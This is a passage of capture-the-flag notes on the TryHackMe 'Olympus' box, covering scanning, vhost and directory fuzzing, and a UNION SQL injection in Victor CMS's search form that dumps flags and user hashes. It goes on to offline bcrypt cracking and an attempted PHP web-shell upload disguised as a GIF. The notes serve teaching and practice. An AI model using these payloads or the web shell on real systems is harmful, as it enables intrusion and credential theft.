@@ -1,0 +1,1437 @@
+---
+description: "Running notes from the TryHackMe Olympus box — recon, vhost discovery, and the road to four flags. Written step by step, as the work happened."
+---
+
+# Olympus — running notes
+
+**TryHackMe · room: Olympus · target: `10.129.154.75`**
+
+> **Flags are redacted here.** Every flag on this page appears as `flag{[redacted]}`.
+> The commands, payloads, offsets and dead ends are all intact — those are what teach.
+> Real values live in a local file outside this repo. See the project's flag policy.
+>
+> **What I deliberately kept:** the two cracked passwords (`summertime`, `snowflake`), the bcrypt
+> hashes truncated to their `$2y$10$` prefix and salt, and the hidden directory / backdoor
+> filenames. Those are *method* — the weak-password-and-reuse lesson and the "obscurity is not a
+> control" lesson do not survive without them, and none of them is a submitted room answer.
+> The four flag values are the only thing that is purely a prize, and they are the only thing gone.
+
+**Room brief (verbatim):**
+
+> Start the machine here and start enumerating! The machine can take some time to start.
+> Please allow up to 5 minutes. **Bruteforcing against any login page is out of scope and
+> should not be used.** If you get stuck, you can find hints on my GitHub repository
+> (you'll find it in the walkthrough section).
+
+Four flags to find. These notes are written **as the work happens** — each step states what I
+am about to do and why, *before* the command runs. Wrong turns stay in.
+
+---
+
+## 0. Scope and ground rules
+
+What "done" looks like: four flag values recovered, each one obtained through a path I can
+re-run and explain. The check that proves it: I can state, for every flag, the exact command
+that produced it.
+
+Constraints taken from the brief, before touching anything:
+
+| Rule | What it means in practice |
+|---|---|
+| No login-page bruteforce | `hydra`/`ffuf` against a password field is off the table. Credentials have to come from somewhere else — a leak, a config, an injection. |
+| Machine needs ~5 min to boot | A refused connection in the first minutes is **not** evidence of a closed port. Re-test before theorising. |
+| Hints exist on the author's GitHub | Held in reserve. Noted as an OSINT lead, not a first move. |
+
+Two load-bearing unknowns going in:
+
+1. **Is the box actually reachable through the VPN?** Everything else is built on this.
+2. **What is the attack surface?** Named "Olympus" with four flags and a no-bruteforce rule
+   — that shape usually means a web app with several chained stages, not a single service exploit.
+
+---
+
+## 1. Reachability — is the VPN carrying traffic to this host?
+
+**Before running:** the target `10.129.154.75` sits in `10.128.0.0/12`. My routing table has to
+send that range down the VPN tunnel, not out the default gateway. Checking the route first is
+cheaper than debugging a scan that was never going to leave the machine.
+
+```bash
+ip route | grep -E '^10\.|tun0'
+```
+
+```
+10.129.154.75 via 192.168.128.1 dev tun0 src 192.168.160.167
+```
+
+`ip route get <ip>` asks the kernel the one question that matters: *"if I sent a packet there
+right now, which interface would it leave by?"* The answer names `tun0`, the VPN interface — so
+traffic is routed into the lab, not out to the internet. Worth ten seconds at the start of every
+engagement; it turns "the box is down" into "my routing is wrong" before you waste a scan on it.
+
+Now ICMP:
+
+```bash
+ping -c 2 -W 3 10.129.154.75
+```
+| Flag | Meaning |
+|---|---|
+| `-c 2` | send exactly 2 packets, then stop (default runs forever) |
+| `-W 3` | wait at most 3 seconds for a reply, then give up |
+
+```
+2 packets transmitted, 2 received, 0% packet loss
+rtt min/avg/max/mdev = 19.124/19.353/19.583/0.229 ms
+```
+
+Host is up, ~19 ms away. Unknown #1 resolved.
+
+> A reply here is a *positive* result and can be trusted. Silence would have proven nothing —
+> plenty of boxes drop ICMP while running a dozen services. That asymmetry is why `nmap -Pn`
+> exists, and why "ping failed so it's down" is one of the most expensive wrong assumptions
+> in this game.
+
+---
+
+## 2. Port scan — what is actually listening?
+
+**Before running:** I want every open TCP port, not the default top-1000. A room built around
+four chained flags can easily hide a service on a high port, and a full sweep costs seconds on a
+lab box. Two passes: a fast wide sweep to find the ports, then a slow deep scan on only those.
+
+```bash
+nmap -p- --min-rate 2000 -T4 -Pn 10.129.154.75
+```
+| Flag | Meaning | Why here |
+|---|---|---|
+| `-p-` | all 65,535 TCP ports | never trust the top-1000 default |
+| `--min-rate 2000` | send at least 2000 packets/sec | full sweep in seconds instead of minutes |
+| `-T4` | aggressive timing template | fast and still accurate on a lab network |
+| `-Pn` | skip host discovery, assume up | I already proved it's up; this stops nmap re-deciding |
+
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Not shown: 65533 closed tcp ports (reset)
+Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
+```
+
+Two ports out of 65,535. `closed (reset)` means the host actively sent a TCP RST for the other
+65,533 — that is a *host* refusing connections, not a firewall silently dropping them. Useful
+distinction: `filtered` would have meant something in the middle was eating packets, and a
+`-Pn -sS` scan would have been worth a second look. Here the picture is clean and small.
+
+**Pass 2 — deep scan, only the two ports that exist:**
+
+```bash
+nmap -sV -sC -p 22,80 -Pn 10.129.154.75
+```
+| Flag | Meaning | Why |
+|---|---|---|
+| `-p 22,80` | only these two | no reason to re-walk 65k ports |
+| `-sV` | probe each service for its software + version | version strings feed CVE lookups and OS guesses |
+| `-sC` | run nmap's default NSE script set | grabs HTTP titles, redirect targets, SSH host keys for free |
+
+```
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://olympus.thm
+```
+
+Three things fall out of this, and the third one is the whole next move:
+
+1. **OpenSSH 8.2p1 + Apache 2.4.41 ⇒ Ubuntu 20.04 LTS.** Both are that release's stock
+   versions. Knowing the distro tells me where config files live and which privesc paths are
+   plausible later. Neither version has a famous pre-auth RCE — SSH here is almost certainly a
+   *destination* (once I have credentials), not an entry point.
+2. **SSH with no creds and no bruteforce allowed** — port 22 is parked until something else
+   hands me a username and password. That is a strong hint the intended path runs through port 80.
+3. **`Did not follow redirect to http://olympus.thm`** — the single most valuable line in the scan.
+
+### What that redirect line actually means
+
+I asked for `http://10.129.154.75/` and Apache answered "go to `http://olympus.thm`". That is
+**name-based virtual hosting**: one Apache serving different sites depending on the `Host:` header
+the browser sends. Ask by IP and you get the redirect (or a default placeholder); ask by name and
+you get the real site.
+
+`olympus.thm` is not a real domain — it resolves nowhere on the public internet. My machine has
+to be told, locally, that this name means this IP.
+
+**Before running:** append a mapping to `/etc/hosts`, the file the resolver checks before DNS.
+
+```bash
+echo "10.129.154.75 olympus.thm" | sudo tee -a /etc/hosts
+```
+| Part | Meaning | Why this shape |
+|---|---|---|
+| `echo "IP name"` | prints one hosts-file line | the format is literally `<ip><space><name>` |
+| `\| sudo tee -a /etc/hosts` | append to a root-owned file, as root | `sudo echo >> /etc/hosts` **fails** — the shell opens the redirect as *you*, before `sudo` ever runs. `tee -a` is the process doing the writing, so it inherits root. |
+
+### Dead end (worth keeping): no passwordless sudo
+
+```
+sudo: a terminal is required to read the password
+```
+
+My shell here is non-interactive, so `sudo tee` could not run. Rather than fight it, I switched
+to the **no-root equivalent** for the whole engagement:
+
+```bash
+curl -s --resolve olympus.thm:80:10.129.154.75 http://olympus.thm/
+```
+
+`--resolve <host>:<port>:<ip>` tells curl "for this hostname and port, skip DNS and connect
+straight here." The request that goes out still carries `Host: olympus.thm`, which is the only
+part the server cares about. Same result as the hosts file, no root, and nothing left behind on
+my machine afterwards. If you *can* use `/etc/hosts`, do — a browser needs it. For scripted work
+`--resolve` is strictly better.
+
+### Proving the vhost is real
+
+```bash
+curl -s -i http://10.129.154.75/                                   # by IP
+curl -s -i --resolve olympus.thm:80:10.129.154.75 http://olympus.thm/   # by name
+```
+
+```
+# by IP
+HTTP/1.1 302 Found
+Location: http://olympus.thm
+Content-Length: 0
+
+# by name
+HTTP/1.1 200 OK
+Content-Length: 1948
+```
+
+Same server, same port, same TCP connection — the *only* difference is one header, and one
+answer is a redirect while the other is a real page. That is name-based virtual hosting
+demonstrated in two commands.
+
+---
+
+## 3. Reading the front page
+
+```bash
+curl -s --resolve olympus.thm:80:10.129.154.75 http://olympus.thm/
+```
+
+1948 bytes, and almost all of it is decoration. The parts that matter:
+
+```html
+<title>Olympus</title>
+<meta name="Keywords" content="AperiSolve, Apérisolve, Aperi'Solve, Zeecka">
+<meta name="Author" content="Zeecka">
+...
+<h1 id="logo">Olympus v2</h1>
+...
+<div>The website is still under developpment.</div>
+<div id="notimage" class="hidden">If support is needed, please contact root@the-it-department.
+The old version of the website is still accessible on this domain.</div>
+```
+
+Four findings, in order of how much they change the plan:
+
+**1 — "The old version of the website is still accessible on this domain."**
+This is the room telling me where to go next, in plain English. "On this domain" means another
+**subdomain of `olympus.thm`** — another vhost on the same Apache. Not a directory, not a port.
+It also frames the whole box: a v2 that is a placeholder, and a v1 left running because someone
+forgot. Abandoned-but-reachable is where bugs live.
+
+**2 — `Olympus v2` in the heading.** Version numbers in a UI are free intel. A "v2" implies a
+"v1" exists somewhere, and confirms reading #1 rather than guessing at it.
+
+**3 — `<div id="notimage" class="hidden">`.** That hint is inside an element marked `hidden` —
+CSS hides it from a browser, but it ships in the HTML regardless. **Anything the browser can
+eventually display, it already holds.** A visual pass over this page in Firefox would have shown
+"under developpment" and nothing else; `curl` shows everything. Read the source, not the render.
+
+**4 — `Author: Zeecka`, keywords `Aperi'Solve`.** A real handle, and the name of a real
+steganography tool. This is the OSINT thread the brief mentioned ("hints on my GitHub
+repository"). Noted and parked — I would rather solve the box than read its hints.
+
+`robots.txt` returns 404, so no free listing there.
+
+---
+
+## 4. Finding the old version — vhost fuzzing
+
+**Before running:** the page says another subdomain exists but not its name. I have to guess
+names and detect which one the server treats differently. This is exactly `ffuf`'s vhost mode:
+hold the URL constant at the IP, vary the `Host:` header, and watch for a response that breaks
+the pattern.
+
+The trap here is the **baseline**. Apache answers *every* unknown `Host:` with the same default
+site, so every single word in the wordlist will "hit" with 200 OK. Filtering on status code
+finds nothing. I have to filter on **response size** instead — and to do that I first need to
+know what a miss looks like:
+
+```bash
+curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' \
+  --resolve definitely-not-real.olympus.thm:80:10.129.154.75 \
+  http://definitely-not-real.olympus.thm/
+```
+
+```
+definitely-not-real.olympus.thm  -> 302:0
+zzzznope.olympus.thm             -> 302:0
+aaaa.olympus.thm                 -> 302:0
+olympus.thm                      -> 200:1948
+```
+
+A clean, unambiguous baseline: **any unknown vhost gets `302` with a zero-byte body**; a real one
+gets `200` and content. So `-fc 302` (filter out 302s) is a valid filter here. That is luckier
+than usual — plenty of servers answer every unknown host with a full 200-page default site, and
+then only size filtering works.
+
+**The sweep:**
+
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+     -H "Host: FUZZ.olympus.thm" \
+     -u http://10.129.154.75/ \
+     -fc 302 -t 60
+```
+| Flag | Meaning |
+|---|---|
+| `-u http://10.129.154.75/` | URL stays fixed on the **IP** — the path never changes |
+| `-H "Host: FUZZ.olympus.thm"` | `FUZZ` goes in the **header**, not the URL. This is what makes it a vhost sweep |
+| `-fc 302` | hide the misses we just baselined |
+| `-t 60` | 60 concurrent threads |
+
+Result: **nothing.** 87,000 words, zero hits.
+
+### Wrong turn #1 — themed guessing before the wordlist
+
+Before the ffuf run I burned a minute on an obvious idea: the box is called Olympus, so try the
+Greek pantheon.
+
+```bash
+for s in old v1 dev test staging beta www admin portal legacy backup api \
+         zeus hera poseidon hades athena apollo ares artemis hermes \
+         hephaestus demeter dionysus gaia cronos titan mount library; do
+  r=$(curl -s -o /dev/null -w '%{http_code}:%{size_download}' -H "Host: $s.olympus.thm" http://10.129.154.75/)
+  [ "$r" != "302:0" ] && echo "HIT  $s.olympus.thm -> $r"
+done
+```
+
+Zero hits. Themed guessing is cheap and sometimes free money, but it is a *supplement* to a
+wordlist, never a replacement. Thirty seconds spent, nothing lost, and the loop above is a good
+pattern to keep: baseline first, then print only what differs from the baseline.
+
+### Verifying a negative result before believing it
+
+Two sweeps came back empty. **A surprisingly clean result is a reason to check the instrument,
+not to move on.** So I proved the harness fires real requests:
+
+```bash
+printf 'nonsense1\nnonsense2\n' > tiny.txt
+ffuf -w tiny.txt -H "Host: FUZZ.olympus.thm" -u http://10.129.154.75/ -t 5 -mc all
+```
+```
+nonsense1  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
+nonsense2  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
+```
+
+`-mc all` matches every status code, so nothing is hidden. Requests go out, the server answers,
+misses look exactly like my baseline, and `-fc 302` was correctly discarding them. The tool is
+fine — the *word* simply is not in that list. That distinction is worth the twenty seconds.
+
+---
+
+## 5. Wrong turn #2 — an ffuf run that never left my machine
+
+Rereading the hint, "accessible on this domain" could just as easily mean a **path** as a
+subdomain. Cheap to check, so I swept directories:
+
+```bash
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/FUZZ -H "Host: olympus.thm" \
+     -e .php,.txt,.html,.bak,.zip -fc 404 -t 60
+```
+
+Empty. And this time the emptiness was **my** fault.
+
+`curl` has `--resolve`; **`ffuf` does not.** I put the hostname in the URL, so ffuf handed
+`olympus.thm` to the system resolver, which has no entry for it (remember: `sudo` failed, so
+there is no `/etc/hosts` line). Every request died at DNS. `-s` plus `2>/dev/null` swallowed the
+errors, so a total failure rendered as a clean "no results."
+
+The correct shape puts the **IP in the URL** and the **name in the header** — same as the vhost
+sweep:
+
+```bash
+ffuf -w /usr/share/wordlists/dirb/common.txt \
+     -u http://10.129.154.75/FUZZ \
+     -H "Host: olympus.thm" \
+     -e .php,.txt,.html,.bak,.zip -fc 404 -t 60
+```
+
+> **Lesson, and it cost me twice on this box:** an empty result set means one of two things —
+> *"the thing is not there"* or *"my request never arrived."* They look identical on screen.
+> Always run a **known-good control** through the same command. Here `/static/` was the control:
+> the front page links to `/static/style.css`, so that directory must exist.
+>
+> ```bash
+> curl -s -o /dev/null -w '%{http_code}:%{size_download}\n' -H "Host: olympus.thm" http://10.129.154.75/static
+> # 301:311   <- control passes, sweep is trustworthy
+> ```
+>
+> And never bury stderr behind `2>/dev/null` while you are still establishing that a command
+> works. Silence the noise *after* you trust the tool, not before.
+
+**What the corrected sweep found:**
+
+| Path | Status | What it is |
+|---|---|---|
+| `/index.php` | `200` | the v2 placeholder page itself |
+| `/static/` | `301` → `/static/` | site assets (my control) |
+| `/javascript/` | `403` | Debian's stock `/usr/share/javascript` alias |
+| `/phpmyadmin` | `403` | stock alias, access-denied at the Apache level |
+| `/server-status` | `403` | `mod_status`, restricted to localhost |
+| `/~webmaster/` | `301` | `mod_userdir` |
+| `.htaccess`, `.htpasswd` | `403` | Apache refusing to serve its own config — expected |
+
+Every one of these is **Apache/Debian packaging default**, not application content. `/phpmyadmin`
+returning 403 rather than 404 is mildly interesting — it means the alias is configured — but a
+403 from Apache config is not something a wordlist gets past. None of this is the "old version".
+
+So the hint did mean a subdomain after all, and my first wordlist simply did not contain the
+word. Escalating to the medium list — 220,000 entries instead of 87,000.
+
+### Wrong turn #3 — I DoS'd the box with my own scan
+
+The medium-list sweep ran at `-t 80`. Ten minutes later it had produced nothing *and* an
+unrelated one-line `curl` was hanging. The box had stopped answering.
+
+```bash
+curl -s -m 10 -o /dev/null -w '%{http_code}:%{size_download} time=%{time_total}\n' \
+  -H "Host: olympus.thm" http://10.129.154.75/
+# 200:1948 time=0.039868   <- fine again, once the scan was killed
+```
+
+80 concurrent connections is nothing against real infrastructure and plenty against a 1-vCPU lab
+VM sharing a host with fifty others. **When a target gets slow mid-engagement, suspect your own
+traffic before you suspect the target.** I killed the scan and dropped to sane thread counts for
+the rest of the box. It also matters for the exam: a scan that knocks the target over costs you
+the target.
+
+---
+
+## 6. `/~webmaster/` — the old site, found by accident
+
+The corrected directory sweep had listed `/~webmaster/` as a `301`. I nearly skipped it as more
+Apache packaging noise — `mod_userdir` is enabled by default on Debian, and `/~user/` usually
+resolves to an empty or missing `~/public_html`. Following it anyway:
+
+```bash
+curl -s -H "Host: olympus.thm" "http://10.129.154.75/~webmaster/"
+```
+
+```html
+<!-- @author 'Victor Alagwu';
+//   @project 'Simple Content Management System';
+//   @date    '0ctober 2016'; -->
+<title>Victor CMS</title>
+...
+<h2><a href="post.php?post=2">Dear Gods and Godess</a></h2>
+<p><strong>This is the first version of the Olympus website.</strong></p>
+```
+
+**That is the old version.** Not a subdomain at all — a *user directory*. Two sweeps and a hint
+that reads like "subdomain" sent me hunting vhosts for half an hour, when the answer was one
+`mod_userdir` path the very first directory sweep had already printed.
+
+> **`mod_userdir` is real attack surface, and it is easy to dismiss.** `/~name/` maps to
+> `/home/name/public_html/`. It is enabled by default, it is invisible to subdomain enumeration,
+> and most wordlists contain the bare word (`webmaster`) but not the tilde form. When a directory
+> sweep hands you a `/~something/`, open it — it is a different filesystem tree, often running an
+> app nobody remembers deploying.
+
+### A correction I had to make mid-analysis
+
+My first look at this page came back with everything HTML-escaped (`&lt;!DOCTYPE html&gt;`), and
+I briefly wrote it up as **PHP source disclosure** — a misconfigured handler serving `.php` as
+text. That was wrong. The escaping came from how my tooling rendered the captured output, not
+from the server. Fetching it again plainly showed ordinary rendered HTML, and the response
+headers confirm PHP is executing normally:
+
+```
+Set-Cookie: PHPSESSID=veghuevc132qsj49h64pb72ajt; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+```
+
+That `Expires: 1981` line is PHP's `session_start()` cache-limiter — a fingerprint of PHP
+*running*, not of PHP being dumped. Worth flagging the error rather than quietly deleting it: a
+misread artefact almost sent me down a source-disclosure path that did not exist.
+
+### Mapping what actually exists
+
+```bash
+for p in "" index.php post.php search.php register.php admin/ includes/ includes/login.php img/ css/ js/ config.php; do
+  printf '%-24s -> ' "/$p"
+  curl -s -m 10 -o /dev/null -w '%{http_code}:%{size_download}\n' -H "Host: olympus.thm" "http://10.129.154.75/~webmaster/$p"
+done
+```
+
+| Path | Status | Note |
+|---|---|---|
+| `/` , `/index.php` | `200:9386` | the CMS front page |
+| `/search.php` | `200:6621` | **a search form — POST `search`** |
+| `/admin/` | `302` → `../index.php` | admin panel, bounces me out (not logged in) |
+| `/includes/` | `200:2377` | **directory listing enabled** |
+| `/css/`, `/js/` | `200` | listings too |
+| `/post.php`, `/register.php`, `/config.php` | `404` | removed from this deployment |
+| `/img/` | `403` | listing denied |
+
+`post.php` returning 404 while the front page links to it everywhere is a nice detail: whoever
+"retired" v1 deleted the pages that let you *interact*, but left `index.php` and `search.php`
+behind. Half-deleting an app is worse than leaving it alone — the remaining half still talks to
+the same database.
+
+`/includes/` gives up the file list for free:
+
+```
+db.php  footer.php  header.php  login.php  logout.php  navbar.php  sidebar.php  widget.php
+```
+
+`db.php` is the credentials file, but fetching it returns 114 bytes of HTML comment — PHP
+executes it, so the `$conn = mysqli_connect(...)` line never reaches me. Expected, and worth
+trying every time; a single misconfigured handler would have handed over the DB password.
+
+---
+
+## 7. Flag 1 — SQL injection in the search form
+
+**Before running:** `search.php` takes a POST parameter and puts it in a query. Victor CMS is a
+2016 teaching project, so the odds of a parameterised query are low. The cheapest possible test
+is one character: a single quote. If the string is concatenated into SQL, that quote breaks the
+syntax and MySQL complains.
+
+```bash
+curl -s -X POST -H "Host: olympus.thm" -d "search=a&submit=1"  http://10.129.154.75/~webmaster/search.php | wc -c   # 8360
+curl -s -X POST -H "Host: olympus.thm" -d "search='&submit=1"  http://10.129.154.75/~webmaster/search.php | wc -c   # 2671
+```
+
+The size collapses from 8360 to 2671 bytes. Something broke. What broke:
+
+```
+Query Fail
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server
+version for the right syntax to use near '%' AND post_status='publish'' at line 1
+```
+
+**This error message is a gift.** It does not just say "there is an injection" — it prints the
+tail of the query, which tells me the exact shape I have to break out of:
+
+```sql
+SELECT ... FROM posts WHERE post_tags LIKE '%<INPUT>%' AND post_status='publish'
+```
+
+So my input lands **inside a `LIKE '%...%'`**. To take control I must close the wildcard *and*
+the quote — `%'` — then append my own SQL, then comment away the trailing `%' AND post_status=...`
+that would otherwise break everything. That gives the payload skeleton used for the rest of this
+section:
+
+```
+zzznope%' UNION SELECT ... -- -
+```
+
+| Piece | Why it is there |
+|---|---|
+| `zzznope` | a search term that matches **nothing**, so the only rows returned are mine |
+| `%'` | closes the `LIKE '%` wildcard and the quote — this is the actual break-out |
+| `UNION SELECT …` | glues my result set onto the app's |
+| `-- -` | SQL comment: kills the rest of the original query. The **trailing space-dash matters** — MySQL requires whitespace after `--`, and a bare `-- ` with a trailing space gets stripped by HTTP. `-- -` survives both. |
+
+### Counting the columns (and a probe that lied)
+
+A `UNION` needs exactly as many columns as the original query. `ORDER BY n` is the standard way
+to count: it succeeds while `n` ≤ column count and errors past it.
+
+```bash
+for n in 1 2 3 4 5 6 7 8 9 10; do ... "a%' ORDER BY $n-- -" ... done
+# 1..10 -> all ok
+```
+
+Every value passed. Two possible readings: the injection is not working, or the table simply has
+ten or more columns. I had grepped for `Query Fail`, and seeing zero of them, my first instinct
+was that my payload was broken.
+
+**Test the instrument, not the theory.** A deliberately absurd value settles it in one request:
+
+```bash
+... "a%' ORDER BY 100-- -"
+# Query Fail: Unknown column '100' in 'order clause'
+```
+
+The injection works fine — I had just picked a range that was too small and mistaken "no errors"
+for "no injection". Extending the loop:
+
+```
+ORDER BY 10 -> ok
+ORDER BY 11 -> FAIL (Unknown column '11')
+```
+
+**Ten columns.**
+
+### Finding which columns are printed
+
+A `UNION` with ten string markers shows where each column ends up in the HTML:
+
+```bash
+search=zzznope%' UNION SELECT 'c1','c2','c3','c4','c5','c6','c7','c8','c9','c10'-- -
+```
+
+```html
+<h2><a href="#">c3</a></h2>                                  <- column 3 = post title
+<h3>by <a href="#">c4</a></h3>                               <- column 4 = author
+<span ...></span>Posted on c5</p>                            <- column 5 = date
+<img ... src="img/c6" ...>                                   <- column 6 = image
+<p>c7.........</p>                                           <- column 7 = body (truncated!)
+<a href="post.php?post=c1">                                  <- column 1 = post id
+```
+
+Column **3** is the best output channel: it sits alone inside `<h2><a href="#">…</a></h2>`, which
+is trivially greppable, and unlike column 7 the app does not truncate it with `.........`.
+
+That gives a reusable one-liner for the rest of the box — hand it any SQL expression, get the
+value back:
+
+```bash
+Q() {
+  curl -s -m 20 -X POST -H "Host: olympus.thm" \
+    --data-urlencode "search=zzznope%' UNION SELECT 1,2,($1),4,5,6,7,8,9,10-- -" \
+    -d "submit=1" "http://10.129.154.75/~webmaster/search.php" \
+  | grep -oP '(?<=<h2><a href="#">).*?(?=</a></h2>)'
+}
+```
+
+| Piece | Why |
+|---|---|
+| `--data-urlencode` | the payload contains `%`, `'`, `&`, `+` — plain `-d` would mangle every one of them. **This is not optional here**: a raw `%` in a POST body is read as the start of a percent-escape and silently corrupts the payload. |
+| `($1)` in column 3 | wrapping in parentheses lets a full `SELECT … FROM …` subquery sit in a column slot |
+| `grep -oP '(?<=…)(?=…)'` | Perl lookarounds: match *between* the two fixed strings, print only what is between them |
+
+### Enumerating
+
+```bash
+Q "database()"                                                          # olympus
+Q "user()"                                                              # phpmyadmin@localhost
+Q "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
+# categories,chats,comments,flag,posts,users
+```
+
+`group_concat()` is what makes this efficient: a UNION column returns **one** value, but
+`group_concat` collapses an entire result set into a single comma-separated string. One request
+per question instead of one per row.
+
+There is a table called **`flag`**.
+
+```bash
+Q "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'"   # flag
+Q "SELECT group_concat(flag) FROM flag"
+```
+
+```
+flag{[redacted]}
+```
+
+**Flag 1 — done.** Recovered from the database, not from a file.
+
+---
+
+## 8. Cracking a password (which is *not* login-page bruteforce)
+
+The `users` table is the real prize:
+
+```bash
+Q "SELECT group_concat(user_id,'|',user_name,'|',user_role,'|',randsalt,'|',user_password SEPARATOR ' ### ') FROM olympus.users"
+```
+
+```
+3|prometheus|User||$2y$10$YC6uoMwK9VpB5QL513vfLu…[truncated]
+6|root|Admin|dgas|$2y$10$lcs4XWc5yjVNsMb4CUBGJe…[truncated]
+7|zeus|User|dgas|$2y$10$cpJKDXh2wlAI5KlCsUaLCO…[truncated]
+```
+
+`$2y$10$` is **bcrypt**, cost factor 10 (2¹⁰ = 1024 iterations per guess). Deliberately slow, which
+is the entire point of the algorithm.
+
+**On the room's rule.** The brief forbids *bruteforcing against any login page*. Cracking a hash I
+already extracted is a different activity: it happens entirely on my machine, sends the target
+zero packets, and triggers no lockout or logging. The rule exists to stop people hammering
+`/login.php` with hydra. Offline cracking is in scope — and post 3 ("some of you use really common
+passwords") is the author telling you to do exactly this.
+
+```bash
+john --format=bcrypt --wordlist=rockyou.txt hashes.txt
+```
+| Piece | Meaning |
+|---|---|
+| `--format=bcrypt` | tell John the type explicitly — it *can* autodetect, but being explicit avoids it loading a wrong format |
+| `--wordlist=…` | straight dictionary attack |
+| `hashes.txt` | lines of `user:hash` |
+
+`rockyou.txt` ships gzipped on Kali, so unpack it first:
+```bash
+gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt   # 14,344,392 lines
+```
+
+```
+prometheus:summertime
+1 password hash cracked, 2 left
+```
+
+**The real numbers, read out of `john.log` rather than remembered** — and they matter, because they
+are the difference between "bcrypt is slow" as a slogan and as a measurement:
+
+```
+Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024
+summertime       (prometheus)
+Wait...1g 0:00:32:11 0.56% (ETA: 2026-08-29 00:42) 0.000517g/s 49.43p/s 100.9c/s
+Session aborted
+```
+
+Read that line by line:
+
+- **`0:00:32:11`** — the session ran for **32 minutes 11 seconds** before I killed it.
+- **`0.56%`** — it was **half of one percent** through rockyou.
+- **`49.43p/s`** — **49 password candidates per second.** Not thousands. Forty-nine.
+- **`ETA: 2026-08-29`** — john's own estimate to finish the wordlist: **four days.**
+
+`prometheus` fell somewhere inside that 32-minute window. `root` and `zeus` were never going to —
+they are not in rockyou, and at 49 guesses/sec exhausting 14.3M candidates takes days, exactly as
+john predicted.
+
+> **A correction, kept in on purpose.** An earlier version of this write-up said the crack took
+> "about two minutes" at "~300 guesses/sec." **Both numbers were wrong** — off by roughly 16× on
+> time and 6× on rate — because they were written from memory of watching the terminal rather than
+> read out of the log file that was sitting on disk the whole time. The lesson is not about bcrypt.
+> It is: **quote exact numbers from the artefact, never from your memory of the artefact.** A report
+> that misstates a cracking rate by 6× is a report whose other numbers a client will stop trusting.
+
+**And the substantive point survives the correction intact:** bcrypt did its job perfectly. Two of
+three hashes are effectively uncrackable at this cost factor. **One weak password out of three is
+all an attacker needs.**
+
+> **Note the `randsalt` column.** bcrypt already embeds its own salt in the hash string; a separate
+> `randsalt` column means the developer bolted on a second, hand-rolled salting scheme. It changes
+> nothing about crackability here and is a good example of security theatre — but notice
+> `root` and `zeus` share the salt `dgas`, which defeats the entire purpose of a per-user salt.
+
+### Logging in
+
+```bash
+curl -s -i -c cookies.jar -H "Host: olympus.thm" \
+  -d "user_name=prometheus&user_password=summertime&login=1" \
+  http://10.129.154.75/~webmaster/includes/login.php
+```
+```
+HTTP/1.1 302 Found
+Location: ../admin
+Set-Cookie: PHPSESSID=1pv2029nhvi4cdfqqqlfi0orju; path=/
+```
+
+`Location: ../admin` instead of a bounce back to the front page = success. `-c cookies.jar` saves
+the session cookie; `-b cookies.jar` replays it on later requests.
+
+### A dead end I spent real time on
+
+The admin panel has `posts.php?source=add_post` with a `post_image` file field — the classic
+Victor CMS route to RCE. I built a polyglot (GIF magic bytes + PHP) and uploaded it:
+
+```bash
+printf 'GIF89a\n<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>\n' > pwn.php
+curl -s -b cookies.jar -H "Host: olympus.thm" \
+  -F "post_title=recon" -F "post_category=1" \
+  -F "post_image=@pwn.php;type=image/gif" \
+  -F "post_tags=recon" -F "post_content=recon" -F "create_post=Publish Post" \
+  "http://10.129.154.75/~webmaster/admin/posts.php?source=add_post"
+```
+
+Then went to fetch it — and hit `403 Forbidden`. So did `/img/img.jpg`, a file that has been
+there since 2022:
+
+```
+img.jpg      -> 403:276
+nothere.php  -> 403:276
+nothere.txt  -> 403:276
+```
+
+**Every** path under `/img/` returns 403, existing or not. Apache denies the whole directory, so
+nothing uploaded there is reachable over HTTP no matter what it contains. The upload probably
+succeeded; it just does not matter.
+
+> **The lesson:** an upload primitive is only worth something if you can *reach* what you uploaded.
+> Check that the destination directory is served **before** you spend time crafting a payload for
+> it. One `curl` against a file you know exists (`/img/img.jpg`) would have told me in five seconds.
+
+---
+
+## 9. The e-mail column, and the vhost my filter threw away
+
+Post 6 ends with a shouted instruction:
+
+> **HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.**
+
+When a CTF shouts a noun at you, look at that noun. So — e-mail addresses:
+
+```bash
+Q "SELECT group_concat(user_name,'=',user_email SEPARATOR ' | ') FROM olympus.users"
+```
+```
+prometheus=prometheus@olympus.thm | root=root@chat.olympus.thm | zeus=zeus@chat.olympus.thm
+```
+
+**`chat.olympus.thm`.** The domain half of an e-mail address is a hostname, and this one names a
+vhost I never found.
+
+Except I *had* tested it. Hours earlier, in the manual sweep:
+
+```
+chat.olympus.thm -> 302:0
+```
+
+I had classified it as a miss. Here is what a miss and a hit actually look like:
+
+```bash
+curl -s -i -H "Host: zzzznope.olympus.thm" http://10.129.154.75/
+# HTTP/1.1 302 Found
+# Location: http://olympus.thm          <- ABSOLUTE url, the default-vhost bounce
+
+curl -s -i -H "Host: chat.olympus.thm" http://10.129.154.75/
+# HTTP/1.1 302 Found
+# Location: login.php                   <- RELATIVE path, an APPLICATION redirect
+```
+
+Both are `302`. Both have `Content-Length: 0`. **My baseline — status plus body size — could not
+tell them apart**, so `-fc 302` in ffuf and `[ "$r" != "302:0" ]` in my loop both discarded the
+one real hit in the list. The wordlist was never the problem. My *discriminator* was.
+
+> **This is the single most important lesson on this box.** A baseline is only as good as the
+> field you compare. Status and size are the defaults because they are convenient, not because
